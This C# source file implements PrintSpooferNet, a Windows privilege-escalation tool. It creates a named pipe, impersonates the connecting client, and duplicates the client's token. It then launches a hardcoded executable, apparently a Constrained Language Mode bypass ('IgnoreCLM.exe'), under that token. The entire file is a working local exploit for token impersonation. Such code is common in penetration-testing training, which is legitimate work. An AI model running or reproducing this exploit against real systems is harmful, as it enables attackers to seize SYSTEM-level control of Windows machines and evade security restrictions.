using System;
using System.Runtime.InteropServices;

namespace PrintSpooferNet
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);

        [DllImport("kernel32.dll")]
        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);

        [DllImport("Advapi32.dll")]
        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);

        [StructLayout(LayoutKind.Sequential)]
        public struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public int Attributes;
        }

        public struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage: PrintSpooferNet.exe pipename");
                return;
            }

            string pipeName = args[0];
            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);

            if (hPipe == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to create named pipe. Error: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Named pipe created successfully.");

            if (!ConnectNamedPipe(hPipe, IntPtr.Zero))
            {
                Console.WriteLine("[-] Failed to connect to named pipe. Error: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Connected to named pipe successfully.");

            if (!ImpersonateNamedPipeClient(hPipe))
            {
                Console.WriteLine("[-] Failed to impersonate named pipe client. Error: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Successfully impersonated named pipe client.");

            IntPtr hToken;
            if (!OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken))
            {
                Console.WriteLine("[-] Failed to open thread token. Error: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Opened thread token successfully.");

            int TokenInfLength = 0;
            GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);

            IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
            if (!GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength))
            {
                Console.WriteLine("[-] Failed to get token information. Error: " + Marshal.GetLastWin32Error());
                Marshal.FreeHGlobal(TokenInformation);
                return;
            }

            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
            IntPtr pstr = IntPtr.Zero;
            if (!ConvertSidToStringSid(TokenUser.User.Sid, out pstr))
            {
                Console.WriteLine("[-] Failed to convert SID to string. Error: " + Marshal.GetLastWin32Error());
                Marshal.FreeHGlobal(TokenInformation);
                return;
            }

            string sidstr = Marshal.PtrToStringAuto(pstr);
            Console.WriteLine("[+] Found SID: {0}", sidstr);
            Marshal.FreeHGlobal(TokenInformation);

            IntPtr hSystemToken = IntPtr.Zero;
            if (!DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken))
            {
                Console.WriteLine("[-] Failed to duplicate token. Error: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Token duplicated successfully.");

            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);

            if (!CreateProcessWithTokenW(hSystemToken, 0, null, "C:\\Users\\admin\\Desktop\\IgnoreCLM.exe", 0, IntPtr.Zero, null, ref si, out pi))
            {
                Console.WriteLine("[-] Failed to create process with token. Error: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Process created successfully with token.");
        }


    }
}
